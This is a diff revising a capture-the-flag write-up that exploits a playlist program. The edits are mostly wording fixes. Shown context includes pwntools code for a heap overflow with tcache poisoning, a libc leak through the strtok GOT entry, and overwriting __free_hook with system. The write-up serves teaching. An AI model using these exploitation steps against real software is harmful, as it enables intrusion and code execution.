@@ -78,7 +78,7 @@ When `listoptions()` gets called it will `ls -R` the directory it's in. If we ne
 
 From lines 20-24 we can see that the user supplies a file path that must exist, can't contain the strings `"flag"` and `".."` and must begin with a capital letter between A and Z (no absolute paths). Given the contents of the challenge directory, the only available option is to send a path of one of the song files, i.e. `<Album_Name>/<song_name>.txt` (*or* just the path of an album directory, i.e. `<Album_Name>/`, which will be relevant later). 
 
-The file path is getting read into an global array of structs, which is our playlist of imported songs. This is stored in the `.bss` section, which is readable and writeable (but not executeable). Each struct is 56 bytes long, with 7 fields. The decompilation is a little wonky, but `hacky_...` refers to the fields in the first struct in the array. `hacky_fd_reference` is cast as a `DWORD` pointer, whereas everything else is cast as a `QWORD` point so that's why it's being increased `14 * song_ctr` rather than `7*song_ctr`. Below is what the song struct looks like. 
+The file path is getting read into an global array of structs  which is our playlist of imported songs. This is stored in the `.bss` section, which is readable and writeable (but not executeable). Each struct is 56 bytes long, with 7 fields. The decompilation is a little wonky, but `hacky_...` refers to the fields in the first struct in the array. `hacky_fd_reference` is cast as a `DWORD` pointer, whereas everything else is cast as a `QWORD` point so that's why it's being increased `14 * song_ctr` rather than `7*song_ctr`. Below is what the song struct looks like. 
 
 ![song_struct](../../images/song_struct.png)
 
@@ -170,7 +170,7 @@ p.send("A" * 100)
 
 p.interactive()
 ```
-To make it easier, I defined a couple helper functions from the start. I'm also running the binary with [https://rr-project.org](https://rr-project.org/) which is great, and I highly recommend it. It records the execution and allows you to step through it as you would in gdb normally (with gef/peda/etc.) but you can also reverse-continue, reverse-step, reverse-next, etc. 
+To make it easier, I defined a couple helper functions from the start. I'm also running the binary with [https://rr-project.org](https://rr-project.org/) which is great, and I highly recommend it. It records the execution and allows you to step through it as you would in gdb normally (with gef/peda/etc.) but you can also reverse-continue, reverse-step, reverse-next, etc. I also use [gef](https://gef.readthedocs.io/en/master/) on top of gdb. 
 
 I imported 43 songs normally and for the 44th one, I gave it the file path `Cannibal////////////////` since the name must be 24 bytes without any '.' for this to work. Then I play that song, giving it -1 as a file size and a bunch of 'A's. Let's see what happens in rr/gdb/gef. 
 
@@ -566,11 +566,11 @@ tl;dr if we can write to the `__free_hook`, we can write the address for `system
 
 # What does a Ke$ha song and this exploit have in common? A good hook
 
-Because we are given the libc that is running on the server, we know we know the offset of the free hook from the base of libc. But we don't know what address the libc base address will be during execution because of [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization). So we need to leak an address in libc. 
+Because we are given the libc version running on the server, we know the offset of the free hook from the base of libc. But we don't know what the libc base address will be during execution because of [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization). So we need to leak an address in libc during runtime. 
 
-Luckily we can find libc by overwriting the lyrics pointers in a song struct. When we call `play_song` for that song, if the lyrics pointer is not null it will print out whatever it's pointing at. If we point it at the GOT, it will point out an address in libc. We know where the GOT because it's at a fixed address as the binary doesn't have PIE enabled, and the GOT contains function pointers to libc. All we need to get is any address in libc to figure out the base address. 
+Luckily we can find libc by overwriting the lyrics pointers in a song struct. When we call `play_song` for that song, if the lyrics pointer is not null it will print out whatever it's pointing at. If we point it at the GOT, it will point out an address in libc. We know where the GOT is because it's at a fixed address as the binary doesn't have PIE enabled, and the GOT contains function pointers to libc. All we need to get is any address in libc to figure out the base address. 
 
-There's obviously only one GOT entry worth using, `.got:strtok_ptr` which is at `0x403fc8`. So when we point song #1 at an address in song #2, we choose the lyrics pointer and overwrite it with this address. Then we continue overwriting to set the file descriptors of song #3 and song #4 to 0. 
+There's obviously only one GOT entry worth using, `.got:strtok_ptr` which is at `0x403fc8`. So when we point song #1 at the address of the lyrics pointer in song #2 and overwrite it with this address. Then we continue overwriting song #3 and song #4 to set their file descriptors to 0. 
 
 ```python
 play_song("1")
@@ -603,7 +603,7 @@ free_hook = libc.symbols['__free_hook']
 system_addr = libc.symbols['system']
 ```
 
-Now that we have a leak we can use the same techniques we've used to get to this point to overwrite the freehook. 
+Now that we have a leak we can take the same techniques we've already used to overwrite the freehook. 
 
 We use the first of our two songs with file descriptors of 0 to do a second heap overflow and overwrite another tcache next pointer with the address of the free hook. For this we'll use a 0x3c0 chunk with the song `"Animal/animal.txt"`. Then we can use the second song to write the address of `system` to the freehook. 
 
@@ -703,6 +703,7 @@ remove_song("34") # L (overwritten by K)
 # tcache bin 0x3c0 -> L -> I -> G
 
 """ First Heap Overflow """
+
 play_song("44") # Reads from STDIN
 #Get A from tcache
 p.sendline("-1") # size of "lyrics"
@@ -732,6 +733,7 @@ play_song("27")
 # tcache bin 0x3c0 -> L -> I -> G
 
 """ Write To Songs Array """
+
 play_song("1") # Read from STDIN, songs[0] = song #1
 # Get 0x04040b0 from tcache
 p.sendline("767") # Give lyrics "size" of 767 (will be given a 0x310 chunk)
@@ -748,6 +750,7 @@ p.send(strtok_got_addr + fake_song * 2)
 # tcache bin 0x3c0 -> L -> I -> G
 
 """ Get libc Address """
+
 play_song("2") # Trigger leak of strtok addr (no heap operation)
 # Parse out address leak
 strtok = u64(p.readuntil("So").split(b"\n")[-2] + b'\x00\x00')
@@ -769,6 +772,7 @@ remove_song("38") # K (overflows in L)
 # tcache bin 0x3c0 -> L -> I -> G
 
 """ Second Heap Overflow """
+
 # Reads from STDIN
 play_song("3") 
 # Get chunk K from tcache
